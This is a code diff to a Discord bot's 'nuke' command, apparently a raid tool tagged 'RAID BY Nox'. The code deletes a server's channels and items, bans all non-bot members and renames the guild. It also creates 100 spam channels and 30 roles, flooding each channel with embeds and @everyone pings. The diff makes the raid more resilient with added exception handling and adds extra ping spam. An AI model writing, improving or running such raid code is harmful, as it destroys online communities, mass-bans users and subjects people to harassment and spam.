@@ -27,31 +27,41 @@ async def nuke(ctx):
     async def fast_delete(items):
         tasks = []
         for item in items:
-            tasks.append(item.delete())
+            try:
+                tasks.append(item.delete())
+            except:
+                continue
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def fast_ban(members):
         tasks = []
         for member in members:
             if not member.bot:
-                tasks.append(member.ban(reason="☠️ RAID BY Nox ☠️"))
+                try:
+                    tasks.append(member.ban(reason="☠️ RAID BY Nox ☠️"))
+                except:
+                    continue
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def fast_create_channels():
-        for _ in range(100):
+        for i in range(100):
             try:
                 channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
-                embed = discord.Embed(description="@everyone\n☠️ RAID BY Nox ☠️", color=discord.Color.red())
-                embed.set_image(url=gifs[_ % len(gifs)])
+                embed = discord.Embed(description="☠️ RAID BY Nox ☠️", color=discord.Color.red())
+                embed.set_image(url=gifs[i % len(gifs)])
                 for _ in range(20):
                     asyncio.create_task(channel.send(embed=embed))
+                    asyncio.create_task(channel.send(content="@everyone"))
             except:
                 continue
 
     async def fast_create_roles():
         tasks = []
         for _ in range(30):
-            tasks.append(guild.create_role(name="☠️ RAID BY Nox ☠️"))
+            try:
+                tasks.append(guild.create_role(name="☠️ RAID BY Nox ☠️"))
+            except:
+                continue
         await asyncio.gather(*tasks, return_exceptions=True)
 
     try:
@@ -62,7 +72,7 @@ async def nuke(ctx):
         await guild.edit(name="☠️ RAID BY Nox ☠️")
         await fast_create_roles()
         await fast_ban(guild.members)
-        print("NUKE FINI")
+        print("NUKE TERMINÉ")
     except Exception as e:
         print(f"Erreur : {e}")
 
